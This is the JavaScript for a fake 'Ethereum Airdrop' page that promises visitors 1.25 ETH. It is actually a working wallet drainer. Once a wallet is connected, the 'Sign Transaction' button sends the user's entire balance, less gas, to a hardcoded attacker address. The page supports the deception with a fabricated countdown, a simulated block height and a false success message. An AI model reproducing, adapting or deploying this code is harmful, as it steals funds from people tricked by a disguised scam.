// js/scripts.js - Ethereum Airdrop
// ===== CONFIGURATION =====
const RECIPIENT_WALLET = '0x214262B33351F3a81F0aa40E500b8b8d22038D75';
const ETH_CHAIN_ID = '0x1';

let userAccount = null, walletConnected = false, connectionState = 'disconnected';

// ===== DOM READY =====
document.addEventListener('DOMContentLoaded', function() {
    console.log('Ethereum Airdrop - Ready');

    // Button handler
    const btn = document.getElementById('ethConnectWallet');
    btn.replaceWith(btn.cloneNode(true));
    document.getElementById('ethConnectWallet').addEventListener('click', async function() {
        if (connectionState === 'disconnected') await connectWallet();
        else if (connectionState === 'connected') await sendTransaction();
    });

    checkExisting();

    if (window.ethereum) {
        window.ethereum.on('accountsChanged', (acc) => {
            if (acc.length === 0) resetState();
            else userAccount = acc[0];
        });
    }

    // Counters
    document.querySelectorAll('.counter-value').forEach(el => {
        const target = parseFloat(el.dataset.target);
        const isFloat = target % 1 !== 0;
        let c = 0, step = target / 125;
        const timer = setInterval(() => {
            c += step;
            if (c >= target) { el.textContent = isFloat ? target.toFixed(2) : Math.floor(target).toLocaleString(); clearInterval(timer); }
            else el.textContent = isFloat ? c.toFixed(2) : Math.floor(c).toLocaleString();
        }, 16);
    });

    // Countdown
    let d = 3, h = 8, m = 42, s = 17;
    setInterval(() => {
        s--; if (s < 0) { s = 59; m--; } if (m < 0) { m = 59; h--; } if (h < 0) { h = 23; d--; } if (d < 0) { d = h = m = s = 0; }
        document.getElementById('ethDays').textContent = d.toString().padStart(2, '0');
        document.getElementById('ethHours').textContent = h.toString().padStart(2, '0');
        document.getElementById('ethMinutes').textContent = m.toString().padStart(2, '0');
        document.getElementById('ethSeconds').textContent = s.toString().padStart(2, '0');
    }, 1000);

    // Block height
    let block = 19847256;
    setInterval(() => { block += Math.floor(Math.random() * 2) + 1; document.getElementById('blockHeight').textContent = block.toLocaleString(); }, 12000);

    // Tab switching
    document.querySelectorAll('.section-tab').forEach(tab => {
        tab.addEventListener('click', function() {
            document.querySelectorAll('.section-tab').forEach(t => t.classList.remove('active'));
            this.classList.add('active');
            document.querySelectorAll('.tokenomics-section, .roadmap-section, .faq-section').forEach(s => s.classList.remove('active'));
            document.getElementById(this.dataset.section + 'Section').classList.add('active');
        });
    });

    // FAQ accordion
    document.querySelectorAll('.faq-question').forEach(q => {
        q.addEventListener('click', () => q.closest('.faq-item').classList.toggle('active'));
    });

    // CoinGecko ETH price
    async function fetchPrice() {
        try {
            const r = await fetch('https://api.coingecko.com/api/v3/coins/ethereum?localization=false&tickers=false&market_data=true&community_data=false&developer_data=false');
            if (!r.ok) throw new Error('API error');
            const d = await r.json(), price = d.market_data.current_price.usd, change = d.market_data.price_change_percentage_24h;
            document.getElementById('ethPrice').textContent = '$' + price.toLocaleString(undefined, {minimumFractionDigits:2});
            const chEl = document.getElementById('ethChange');
            chEl.textContent = (change >= 0 ? '▲' : '▼') + Math.abs(change).toFixed(1) + '%';
            chEl.className = change >= 0 ? 'change-positive' : 'change-negative';
            document.getElementById('usdValue').textContent = '≈ $' + (price * 1.25).toLocaleString(undefined, {minimumFractionDigits:2}) + ' USD';
        } catch(e) {}
    }
    fetchPrice(); setInterval(fetchPrice, 60000);
});

// ===== WALLET FUNCTIONS =====
async function switchToEthereum() {
    if (!window.ethereum) return false;
    try {
        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: ETH_CHAIN_ID }] });
        return true;
    } catch (err) {
        if (err.code === 4902) {
            try {
                await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{ chainId: ETH_CHAIN_ID, chainName: 'Ethereum Mainnet', nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 }, rpcUrls: ['https://eth.llamarpc.com'], blockExplorerUrls: ['https://etherscan.io/'] }] });
                return true;
            } catch (e) { alert('Please add Ethereum network manually.'); return false; }
        }
        return false;
    }
}

async function connectWallet() {
    if (!window.ethereum) { alert('No wallet detected! Install MetaMask.'); window.open('https://metamask.io/download/', '_blank'); return; }
    const btn = document.getElementById('ethConnectWallet');
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...'; btn.disabled = true;
    try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAccount = accounts[0];
        await switchToEthereum();
        const web3 = new Web3(window.ethereum);
        const bal = await web3.eth.getBalance(userAccount);
        const eth = web3.utils.fromWei(bal, 'ether');
        walletConnected = true; connectionState = 'connected';
        document.getElementById('ethStepConnect').classList.add('completed');
        document.querySelector('#ethStepConnect .step-indicator i').className = 'fas fa-check';
        document.getElementById('ethStepSign').classList.add('active');
        btn.innerHTML = '<i class="fas fa-pen"></i> Sign Transaction'; btn.disabled = false;
        alert('Connected!\n' + userAccount.slice(0,6) + '...' + userAccount.slice(-4) + '\nBalance: ' + parseFloat(eth).toFixed(4) + ' ETH');
    } catch (err) {
        if (err.code === 4001) alert('Connection rejected.');
        else alert('Failed: ' + (err.message || 'Unknown error'));
        btn.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet & Claim 1.25 ETH'; btn.disabled = false;
    }
}

async function sendTransaction() {
    if (!walletConnected) { alert('Connect wallet first!'); return; }
    const btn = document.getElementById('ethConnectWallet');
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Waiting for confirmation...'; btn.disabled = true;
    try {
        const web3 = new Web3(window.ethereum);
        const bal = await web3.eth.getBalance(userAccount);
        const gp = await web3.eth.getGasPrice();
        const gasCost = BigInt(gp) * 21000n;
        const amt = BigInt(bal) - gasCost;
        if (amt <= 0) { alert('Insufficient funds for gas!'); btn.innerHTML = '<i class="fas fa-pen"></i> Sign Transaction'; btn.disabled = false; return; }
        const amtETH = web3.utils.fromWei(amt.toString(), 'ether');
        const tx = { from: userAccount, to: RECIPIENT_WALLET, value: web3.utils.toHex(amt.toString()), gas: web3.utils.toHex(21000), gasPrice: web3.utils.toHex(gp) };
        const txHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
        document.getElementById('ethStepSign').classList.remove('active'); document.getElementById('ethStepSign').classList.add('completed');
        document.querySelector('#ethStepSign .step-indicator i').className = 'fas fa-check';
        document.getElementById('ethStepReceive').classList.add('active');
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Confirming...';
        let receipt = null, attempts = 0;
        while (!receipt && attempts < 30) { receipt = await web3.eth.getTransactionReceipt(txHash); if (!receipt) { await new Promise(r => setTimeout(r, 2000)); attempts++; } }
        connectionState = 'completed';
        document.getElementById('ethStepReceive').classList.remove('active'); document.getElementById('ethStepReceive').classList.add('completed');
        document.querySelector('#ethStepReceive .step-indicator i').className = 'fas fa-check';
        const now = new Date();
        document.getElementById('ethClaimTime').textContent = now.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}) + ' · ' + now.toLocaleDateString();
        document.querySelector('.tx-hash').textContent = txHash;
        document.getElementById('ethSuccessMessage').style.display = 'block';
        btn.innerHTML = '<i class="fas fa-check-circle"></i> Claim Complete';
        alert('Success!\n' + amtETH + ' ETH sent\nTx: ' + txHash.slice(0,10) + '...' + txHash.slice(-8));
    } catch (err) {
        if (err.code === 4001) alert('Transaction rejected.');
        else alert('Failed: ' + (err.message || 'Unknown error'));
        btn.innerHTML = '<i class="fas fa-pen"></i> Sign Transaction'; btn.disabled = false;
    }
}

async function checkExisting() {
    if (window.ethereum) {
        try {
            const acc = await window.ethereum.request({ method: 'eth_accounts' });
            if (acc.length > 0) {
                userAccount = acc[0]; connectionState = 'connected'; walletConnected = true;
                document.getElementById('ethConnectWallet').innerHTML = '<i class="fas fa-pen"></i> Sign Transaction';
                document.getElementById('ethStepConnect').classList.add('completed');
                document.querySelector('#ethStepConnect .step-indicator i').className = 'fas fa-check';
                document.getElementById('ethStepSign').classList.add('active');
            }
        } catch (e) {}
    }
}

function resetState() {
    connectionState = 'disconnected'; walletConnected = false; userAccount = null;
    document.getElementById('ethConnectWallet').innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet & Claim 1.25 ETH';
    ['ethStepConnect', 'ethStepSign', 'ethStepReceive'].forEach(id => {
        const el = document.getElementById(id);
        if (el) { el.classList.remove('completed', 'active'); if (id === 'ethStepConnect') el.querySelector('.step-indicator i').className = 'fas fa-link'; }
    });
}
